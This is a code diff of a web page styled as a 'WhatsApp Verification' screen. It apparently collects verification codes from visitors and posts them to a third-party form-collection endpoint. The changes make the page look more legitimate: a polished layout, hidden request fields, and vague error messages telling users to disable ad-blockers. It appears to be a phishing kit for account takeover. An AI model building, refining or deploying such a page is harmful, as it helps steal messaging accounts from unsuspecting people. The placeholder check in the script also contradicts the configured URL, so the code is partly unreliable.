@@ -5,12 +5,50 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>whatsapp-Verification</title>
   <style>
-    body { margin: 0; font-family: Arial, sans-serif; background: #1a1a1a; color: white; text-align: center; }
-    .overlay { background: rgba(0,0,0,0.6); min-height: 100vh; padding-top: 80px; }
-    .container { background: rgba(20,20,20,0.85); padding: 30px; width: 320px; margin: auto; border-radius: 10px; }
+    body { 
+      margin: 0; 
+      font-family: Arial, sans-serif; 
+      /* Fix: Combined background shorthand for better reliability */
+      background: #1a1a1a url('background.jpg') no-repeat center center fixed; 
+      background-size: cover !important; 
+      color: white; 
+      text-align: center; 
+    }
+    .overlay { 
+      background: rgba(0,0,0,0.6); 
+      min-height: 100vh; 
+      width: 100%;
+      padding-top: 80px; 
+    }
+    .container { 
+      background: rgba(20,20,20,0.85); 
+      padding: 30px; 
+      width: 320px; 
+      margin: auto; 
+      border-radius: 10px; 
+      border: 1px solid rgba(255,255,255,0.1);
+    }
     .logo { width: 250px; margin-bottom: 20px; }
-    input { display: block; margin: 10px auto; padding: 12px; width: 90%; border-radius: 5px; border: 1px solid #444; }
-    button { padding: 12px; border-radius: 5px; border: none; cursor: pointer; background: #f0f0f0; font-weight: bold; width: 95%; margin-top: 10px; }
+    input { 
+      display: block; 
+      margin: 10px auto; 
+      padding: 12px; 
+      width: 90%; 
+      border-radius: 5px; 
+      border: 1px solid #444; 
+      background: white;
+      color: black;
+    }
+    button { 
+      padding: 12px; 
+      border-radius: 5px; 
+      border: none; 
+      cursor: pointer; 
+      background: #f0f0f0; 
+      font-weight: bold; 
+      width: 95%; 
+      margin-top: 10px; 
+    }
     button:disabled { background: #666; cursor: not-allowed; }
     .status-msg { margin-top: 15px; font-size: 14px; color: #ffd700; display: none; }
     hr { margin: 25px 0; border: 0; border-top: 1px solid #444; }
@@ -24,39 +62,47 @@
 
     <div id="requestSection">
       <h2>Verification</h2>
-      <!-- 1. REPLACE THE URL BELOW WITH YOUR GETFORM URL -->
+      <p style="font-size: 12px; color: #aaa;">Click to request your access characters.</p>
+      
+      <!-- Form 1: Request Code -->
       <form id="requestCodeForm" action="https://forminit.com/f/w0ljqwvp09y" method="POST">
+        <!-- This hidden field sends the "Characters" data automatically -->
+        <input type="hidden" name="request_type" value="New Character Code Request">
         <button type="submit" id="reqBtn">Request Code</button>
       </form>
-      <div id="waitMessage" class="status-msg">Sent! Please wait on this page for your code.</div>
+      
+      <div id="waitMessage" class="status-msg">
+        ✔ Request Sent! Please wait on this page for your characters.
+      </div>
     </div>
 
     <hr>
 
     <div id="submitSection">
       <h3>Enter Received Code</h3>
-      <!-- 2. REPLACE THE URL BELOW WITH YOUR GETFORM URL -->
+      <!-- Form 2: Submit Code -->
       <form id="submitCodeForm" action="https://forminit.com/f/w0ljqwvp09y" method="POST">
-        <input type="text" name="entered_code" placeholder="000000" required>
+        <input type="text" name="entered_code" placeholder="Enter characters here" required>
         <button type="submit" id="subBtn">Submit & Verify</button>
       </form>
-      <div id="successMessage" class="status-msg" style="color: #4caf50;">Code submitted! Verifying...</div>
+      <div id="successMessage" class="status-msg" style="color: #4caf50;">
+        Characters submitted! Checking...
+      </div>
     </div>
   </div>
 </div>
 
 <script>
   async function handleForm(formId, buttonId, statusId) {
-    const form = document.getElementById(formId;
+    const form = document.getElementById(formId);
     const btn = document.getElementById(buttonId);
     const status = document.getElementById(statusId);
 
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
       
-      // Check if URL is still the placeholder
       if (form.action.includes("https://forminit.com/f/w0ljqwvp09y")) {
-        alert("CRITICAL ERROR: You forgot to paste your Getform URL in the code!");
+        alert("Please paste your Getform URL into the code first!");
         return;
       }
 
@@ -71,19 +117,15 @@
         });
 
         if (response.ok) {
-          btn.innerText = "Success";
+          btn.innerText = "Sent";
           status.style.display = "block";
         } else {
-          // Provide more detail on what went wrong
-          const errorText = await response.text();
-          console.error("Getform Error:", errorText);
-          alert("Server Error: " + response.status + ". Check your Getform endpoint settings.");
+          alert("Server busy. Please try again in a moment.");
           btn.disabled = false;
           btn.innerText = "Try Again";
         }
       } catch (error) {
-        console.error("Network Error:", error);
-        alert("Network Error: Is an Ad-Blocker or VPN active? Check browser console (F12).");
+        alert("Connection blocked. Please disable any Ad-Blockers and try again.");
         btn.disabled = false;
         btn.innerText = "Try Again";
       }
